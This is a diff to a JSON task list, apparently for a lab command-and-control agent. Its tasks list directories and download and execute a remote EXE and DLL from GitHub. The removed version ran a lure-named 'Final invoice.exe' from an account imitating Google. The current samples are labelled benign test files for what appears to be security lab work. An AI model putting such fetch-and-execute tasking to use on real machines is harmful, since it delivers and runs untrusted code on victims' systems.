@@ -3,17 +3,26 @@
   "tasks": [
     {
       "action": "print",
-      "message": "System Check Initialized... Running Lab-525 Protocol."
+      "message": "Hello from lab-525: This is a benign message."
     },
     {
       "action": "list_dir",
-      "path": "C:\\Users"
+      "path": "C:\\"
+    },
+    {
+      "action": "fetch_info",
+      "url": "https://raw.githubusercontent.com/your-org/lab-files/main/sample.txt"
     },
     {
       "action": "run_exe",
-      "url": "https://github.com/g00glecenter101-arch/lab-c2/raw/refs/heads/main/Final%20invoice.exe"
+      "url": "https://github.com/shateel/lotl-mshta/raw/refs/heads/main/HelloWorld.exe"
+    },
+    {
+      "action": "run_dll",
+      "url": "https://github.com/shateel/lotl-mshta/raw/refs/heads/main/SimpleDll.dll",
+      "class": "SimpleDll.Program",
+      "method": "ComplexTask",
+      "args": ["Test123"]
     }
   ]
-
 }
-
